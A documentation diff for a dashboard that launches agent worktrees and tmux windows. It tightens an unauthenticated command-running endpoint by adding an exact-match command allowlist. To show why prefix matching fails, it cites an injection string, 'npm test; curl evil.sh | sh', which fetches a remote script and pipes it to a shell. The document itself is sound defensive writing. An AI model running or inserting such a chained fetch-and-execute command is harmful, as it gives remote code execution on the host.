@@ -1141,26 +1141,40 @@ dashboard to spawn processes — the same opt-in shape as
 `enabled: false` and the mutating routes return `503` naming the env var.
 
 > **Security — this endpoint runs commands, and the dashboard has no auth.**
-> `POST /api/worktrees` accepts a `command` and delivers it to the new window
-> with `tmux send-keys`, where tmux runs it in that window's shell. That is the
-> feature, but it means **anyone who can reach the dashboard port while
-> `AGENT_BOARD_ENABLE_TMUX=true` can execute arbitrary commands on the host**,
-> with the privileges of the dashboard process.
 >
-> The dashboard ships with no authentication or authorization on any route, so
-> this endpoint inherits that posture. `AGENT_BOARD_ENABLE_TMUX` is the only
-> gate, which is why it defaults to off.
+> **The route is unauthenticated. That is unmitigated by design in this feature**
+> — the dashboard ships with no authentication or authorization on *any* route
+> (there is no auth middleware in `server.js`), and this endpoint inherits that
+> posture. A reverse proxy can control *who* reaches the port, but it cannot
+> constrain what an authorized caller may then execute, so it does not close
+> this gap. Per-route auth is genuine repo-wide work and is not solved here.
 >
-> What is bounded: worktree names are slugified to `[a-z0-9][a-z0-9-]{0,39}` and
+> Because the route cannot authenticate callers, **what it is willing to execute
+> is gated instead**, via two independent switches:
+>
+> | Env var | Default | Grants |
+> |---------|---------|--------|
+> | `AGENT_BOARD_ENABLE_TMUX` | off | create worktrees and **empty** tmux windows |
+> | `AGENT_BOARD_TMUX_ALLOWED_COMMANDS` | empty | run the listed commands |
+>
+> With the allowlist empty — the default, even when the feature is fully enabled
+> — any request carrying a `command` is refused with `403` and this route cannot
+> execute anything at all. Enabling the feature alone does **not** grant remote
+> command execution; an operator must additionally name each permitted command.
+>
+> Matching is **exact**, never prefix-based: allowing `npm test` does not admit
+> `npm test; curl evil.sh | sh`, because tmux runs the string in a shell and a
+> prefix rule would be trivially bypassable.
+>
+> Also bounded: worktree names are slugified to `[a-z0-9][a-z0-9-]{0,39}` and
 > rejected otherwise, branch names are pattern-checked, commands are capped at
-> 2000 chars, and every command is passed via `execFile` as a single argv
-> element — so callers cannot inject *extra* commands through the slug or
-> branch. The `command` field itself is still executed by design.
+> 2000 chars, and every argument is passed via `execFile` as a single argv
+> element — so callers cannot inject extra commands through the slug or branch.
 >
-> Only enable this on a host you control, bound to a trusted interface. If the
-> dashboard is exposed beyond localhost, put an authenticating reverse proxy in
-> front of it before turning this on. Adding real per-route auth is tracked as
-> repo-wide work, not something this endpoint solves alone.
+> Residual risk, stated plainly: with `AGENT_BOARD_ENABLE_TMUX=true`, any client
+> that can reach the port can create and delete worktrees and tmux windows, and
+> can run any command the operator has allowlisted. Only enable it on a host you
+> control, bound to a trusted interface, and keep the allowlist minimal.
 
 ### Session naming scheme
 
@@ -1189,6 +1203,7 @@ then `Ctrl-b w` gives a human the full picture of every running agent, and
 | `AGENT_BOARD_ENABLE_TMUX` | `false` | Master opt-in switch |
 | `AGENT_BOARD_TMUX_SESSION` | `agentboard` | Session name |
 | `AGENT_BOARD_WORKTREE_ROOT` | `$WORKSPACE_ROOT/.worktrees` | Where worktrees are checked out |
+| `AGENT_BOARD_TMUX_ALLOWED_COMMANDS` | *(empty)* | Comma-separated, exact-match allowlist of commands `POST` may run. Empty means no command may be executed. |
 
 ### Launch an agent
 
@@ -1215,9 +1230,11 @@ curl -X POST http://localhost:3000/api/worktrees \
 }
 ```
 
-`command` is optional; when present it is sent to the new window with
-`tmux send-keys`. A slug that already has a window returns `409` rather than
-launching a second agent into it. Emits `worktree_created` on the event bus.
+`command` is optional; when present it must appear verbatim in
+`AGENT_BOARD_TMUX_ALLOWED_COMMANDS` or the request is refused with `403` before
+anything is created. It is then sent to the new window with `tmux send-keys`.
+A slug that already has a window returns `409` rather than launching a second
+agent into it. Emits `worktree_created` on the event bus.
 
 **Isolation is enforced, never degraded.** A launch either gets its own checkout
 or fails — it will not fall back to the shared worktree root, because that would
